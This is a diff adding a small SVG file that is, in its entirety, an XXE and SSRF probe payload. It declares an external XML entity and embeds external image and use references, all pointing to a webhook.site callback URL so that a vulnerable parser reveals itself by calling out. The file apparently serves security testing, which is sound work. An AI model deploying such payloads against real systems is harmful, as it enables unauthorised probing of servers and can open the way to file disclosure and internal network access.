@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://webhook.site/b1fa0746-9dd1-47e4-9e5b-9b217d386389/SVG-XXE-ENTITY">]>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
+<text>&xxe;</text>
+<image xlink:href="http://webhook.site/b1fa0746-9dd1-47e4-9e5b-9b217d386389/SVG-EXTIMG" width="50" height="50"/>
+<use xlink:href="http://webhook.site/b1fa0746-9dd1-47e4-9e5b-9b217d386389/SVG-USE"/>
+</svg>
